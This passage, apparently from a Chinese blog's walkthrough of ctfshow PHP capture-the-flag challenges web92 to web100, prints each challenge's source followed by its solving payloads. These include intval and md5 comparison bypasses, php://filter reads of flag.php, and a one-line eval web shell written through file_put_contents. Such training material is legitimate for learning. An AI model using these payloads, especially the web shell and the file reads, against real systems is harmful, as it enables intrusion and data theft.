-*-</span></span><br><span class="line"><span class="comment"> Author: Firebasky</span></span><br><span class="line"><span class="comment"> Date:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-09-18 16:29:30</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int intval ( mixed $var [, int $base = 10 ] )</span><br><span class="line"></span><br><span class="line">参数说明：</span><br><span class="line"></span><br><span class="line">    $var：要转换成 integer 的数量值。</span><br><span class="line">    $base：转化所使用的进制。</span><br><span class="line">    </span><br><span class="line">    base如果是0,通过检测,var的格式来决定使用的进制</span><br><span class="line">    如果包含了0x的前缀,使用16进制(hex);</span><br><span class="line">    如果使用0开头,使用8进制</span><br><span class="line">    否则使用十进制</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num=0x117c十六进制</span><br><span class="line">?num=4476e1科学计数法</span><br><span class="line">?num=010574八进制</span><br><span class="line">?num= 010574八进制加空格</span><br></pre></td></tr></table></figure><p>intval()函数如果$base为0则$var中存在字母的话遇到字母就停止读取 但是e这个字母比较特殊,可以再php中不是科学计数法.所以就可以构造4476e123.在弱类型比较适合,4476e123是科学计数法4476*10^123,而在intval函数中,遇到字母就停止读取,因此是4476.</p><h1 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: Firebasky</span></span><br><span class="line"><span class="comment"> Date:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-09-18 16:32:58</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num=010574     八进制</span><br><span class="line">?num= 010574    八进制加空格</span><br></pre></td></tr></table></figure><h1 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-09-18 16:46:19</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">strpos() 函数</span><br><span class="line">strpos() 函数查找字符串在另一字符串中第一次出现的位置</span><br></pre></td></tr></table></figure><p>必须要找到0,并且不能在第一位</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num=4476.0小数点</span><br><span class="line">?num=4476@0特殊字符</span><br><span class="line">?num= 010574八进制加空格</span><br></pre></td></tr></table></figure><p>好多都可以</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403224744676.png" alt="image-20220403224744676"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403224856742.png" alt="image-20220403224856742"></p><h1 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-09-18 16:53:59</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num= 010574八进制加空格</span><br><span class="line">?num=%20010574正负号八进制</span><br></pre></td></tr></table></figure><h1 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-09-18 19:21:24</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]==<span class="string">&#x27;flag.php&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?u=php://filter/read=convert.base64-encode/resource=flag.php</span><br><span class="line">?u=/var/www/html/flag.php             绝对路径</span><br><span class="line">?u=./flag.php                         相对路径</span><br><span class="line">?u=php://filter/resource=flag.phpphp伪协议</span><br></pre></td></tr></table></figure><h1 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-09-18 19:36:32</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php中md5()函数无法处理数组</span><br><span class="line">a[]=1&amp;b[]=2</span><br><span class="line"></span><br><span class="line">md5碰撞</span><br><span class="line">a=%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab</span><br><span class="line"></span><br><span class="line">&amp;b=%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab</span><br><span class="line"></span><br><span class="line">在送一个</span><br><span class="line">%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab</span><br></pre></td></tr></table></figure><p><a href="https://crypto.stackexchange.com/questions/1434/are-there-two-known-strings-which-have-the-same-md5-hash-value">md5强碰撞收集</a></p><h1 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Notice: Undefined index: flag in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">15</span></span><br><span class="line"></span><br><span class="line">Notice: Undefined index: flag in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">16</span></span><br><span class="line"></span><br><span class="line">Notice: Undefined index: HTTP_FLAG in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">17</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-09-18 21:39:27</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;<span class="comment">#如果get存在get就等于post,否则get就等于flag</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;<span class="comment">#如果get的flag=flag那么get等于cookie否则get等于flag</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">#如果getHTTP_FLAG等于flag输出flag否则输出__FILE__</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当get传入值时,get就等于post,那么post传入值也就是get传入值,所以get随便传一个然后post  HTTP_FLAG等于flag</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404114658416.png" alt="image-20220404114658416"></p><h1 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-09-18 22:36:12</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$allow</span> = <span class="keyword">array</span>();<span class="comment">#定义一个allow数组</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">36</span>; <span class="variable">$i</span> &lt; <span class="number">0x36d</span>; <span class="variable">$i</span>++) &#123; <span class="number">0x36d</span>=<span class="number">877</span></span><br><span class="line">    <span class="title function_ invoke__">array_push</span>(<span class="variable">$allow</span>, <span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="variable">$i</span>));<span class="comment">#像数组的尾部插入一个或者多个元素</span></span><br><span class="line">&#125;<span class="comment">#如果设置了n并且n在allow中,这里的在的含义是==也就是弱类型</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$allow</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">&#125;<span class="comment">#就把content写入n中</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>传一个</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?n=1.php</span><br><span class="line">post</span><br><span class="line">content=&lt;?php @eval($_POST[zf]);?&gt;</span><br></pre></td></tr></table></figure><p>至于这里为什么传一,是因为range(1,$i)中每次都包含1,所以1的概率最大</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404120628243.png" alt="image-20220404120628243"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404120134056.png" alt="image-20220404120134056"></p><p>接着去访问这个文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404120158331.png" alt="image-20220404120158331"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404120721930.png" alt="image-20220404120721930"></p><h1 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-09-21 22:10:28</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title class_">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">is_numeric() 函数用于检测变量是否为数字或数字字符串。</span><br><span class="line">bool is_numeric ( mixed $var )</span><br><span class="line">参数说明：</span><br><span class="line">    $var：要检测的变量。</span><br><span class="line">返回值</span><br><span class="line">如果指定的变量是数字和数字字符串则返回 TRUE，否则返回 FALSE，注意浮点型返回 1，即 TRUE。</span><br></pre></td></tr></table></figure><h2 id="and-与-amp-amp"><a href="#and-与-amp-amp" class="headerlink" title="and 与 &amp;&amp;"></a>and 与 &amp;&amp;</h2><figure class="highlight 